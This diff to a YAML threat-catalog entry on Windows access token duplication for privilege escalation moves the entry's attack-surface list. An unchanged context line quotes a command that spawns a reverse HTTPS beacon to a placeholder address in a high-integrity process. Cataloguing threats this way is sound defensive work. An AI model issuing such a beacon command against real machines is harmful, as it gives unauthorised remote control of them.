@@ -25,6 +25,11 @@ threat:
     their privileges to SYSTEM level access (NT AUTHORITY\SYSTEM), but the same 
     threat vector can also be used for defense evasion and other purposes by 
     duplicating other access token types and privilege levels.
+  surface:
+    - Windows
+    - OAuth / OIDC
+    - Remote Access
+    - Windows::Desktop
   severity: Moderate incident
   leverage: Elevation of privilege
   impact: Identity Theft
@@ -56,8 +61,3 @@ threat:
 
     spawn windows/beacon_https/reverse_https (<ip_address>:443) 
     in a high integrity process (token duplication)
-  surface:
-    - Windows
-    - OAuth / OIDC
-    - Remote Access
-    - Windows::Desktop
